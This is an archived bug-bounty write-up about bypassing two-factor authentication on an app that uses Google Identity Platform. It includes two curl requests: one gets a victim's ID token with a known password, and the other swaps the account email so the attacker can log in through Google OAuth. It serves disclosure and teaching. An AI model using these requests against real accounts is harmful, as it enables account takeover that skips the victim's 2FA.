---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-08-07_2fa-bypass-via-google-identity-oauth-login.md
original_filename: 2022-08-07_2fa-bypass-via-google-identity-oauth-login.md
title: 2FA Bypass via Google Identity & OAuth Login
category: documents
detected_topics:
- mfa
- oauth
- command-injection
- otp
tags:
- imported
- documents
- mfa
- oauth
- command-injection
- otp
language: en
raw_sha256: 6bd23bb59f4bd7192fcd48d40d205d7b7c61b76b55d4aa90b06a17ebb1cfcff1
text_sha256: 9873b70518b7dd26fff5db3930cd677117831e394aca53497447f7eba03f538a
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: false
---

# 2FA Bypass via Google Identity & OAuth Login

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-08-07_2fa-bypass-via-google-identity-oauth-login.md
- Source Type: markdown
- Detected Topics: mfa, oauth, command-injection, otp
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: False
- Raw SHA256: `6bd23bb59f4bd7192fcd48d40d205d7b7c61b76b55d4aa90b06a17ebb1cfcff1`
- Text SHA256: `9873b70518b7dd26fff5db3930cd677117831e394aca53497447f7eba03f538a`


## Content

---
title: "2FA Bypass via Google Identity & OAuth Login"
url: "https://medium.com/@sharp488/2fa-bypass-via-google-identity-oauth-login-6c991ac837af"
authors: ["Sharat Kaikolamthuruthil (@sharp488)"]
bugs: ["2FA / MFA bypass", "Account takeover"]
publication_date: "2022-08-07"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2357
scraped_via: "browseros"
---

# 2FA Bypass via Google Identity & OAuth Login

2FA Bypass via Google Identity & OAuth Login
Sharat Kaikolamthuruthil
Follow
2 min read
·
Aug 7, 2022

95

4

2FA Bypass via Google Identity & OAuth Login

Hello All,

This write-up is about another 2FA bypass that I was able to find on a private program. The application was using third party service for authentication. In this case it was Google Cloud Platform service called Identity Platform.

Press enter or click to view image in full size

After authentication, the application redirects users to 2FA verification page.

Using the curl command given below, an attacker is able to retrieve the ID Token of a 2FA enabled account

Get ID Token

curl ‘https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSr5kAE4GhcjsiwkNSks7sKSNbajsHn-SDk8' \
-H ‘Content-Type: application/json’ \
— data-binary ‘{“email”:”victim@wearehackerone.com”,”password”:”pass@1234",”returnSecureToken”:true}’

Press enter or click to view image in full size
ID Token retrieved

Once attacker has the token, the victim’s account email can be updated into attacker’s email id. Attacker will update it with his gmail id which will be used to bypass the 2FA.

Get Sharat Kaikolamthuruthil’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Update email

curl ‘https://identitytoolkit.googleapis.com/v1/accounts:update?key=AIzaSr5kAE4GhcjsiwkNSks7sKSNbajsHn-SDk8' \

-H ‘Content-Type: application/json’ \

— data-binary \

‘{“idToken”:”eyJhbGciOiJSUzI1NiIsImtpZCI6IjA2M2E3Y2E0M2MzYzc2MDM2NzRlZGE0YmU5NzcyNWI3M2QwZGMwMWYiLCJ0eXAiOiJKV1.eyJyTRHsasdhasdjhsakdhaksjdaskjdsakdnkkcnm-wqe7qw909231kjSAHYnAjdlkjlksajdAHkhjbbqjksapOkJlkjqwejqwlknebnasdbasdbksagdjhvqwjkeqwgufebsadkjbsakajshd7qw86wqdehjkwqt521kKLWSJDLAjdja;sdjas;dj;sajdlasjd;kajsd.DbRLQU1bhwWOMQ9e-6IPb4VJmMMLdepYxP85OwQ5jX9PGw200Wl7GypNvDSXWqK0ArdcoQnLfOB-q00u03R1GGjalFgkAJSRdX9yQDZThwUKKXPQRvJBcKTuYpMesXY5UlI-m0UfOP-RjWWFi_TVvbFDmC9kuhutQ3_FmJs7HUq0Rj0TzagjrHBuXf9zDCoxvoIoyKjee9RvtPcrPUK8o1xs8hs7SNX9ioKoe4VLeAFVTEn8YiAQS-VqnnCe64yPjhV4sAvuJ1uDGA-_z-IMRJO9aJ7f0jTmU-WNzIRwQlTEgCOeWONkwHe-qJSX2Ph1z9QQRyEsoaDLgIuOw9lciw”,”email”:”attacker@gmail.com”,”returnSecureToken”:true}’

After updating the email id, attacker uses the Google OAuth option for authentication which is the alternative login method provided by the application.

Now attacker logs in with “attacker@gmail.com” & its password which grants them full access to victim’s account. Hence the 2FA implementation is bypassed successfully.

Since the attacker could gain complete access to victim’s account, it was triaged as High severity bug.

Hope you learned something new, have a good day. 😃

Disclaimer: For educational purpose only please do not try for illegal activities.
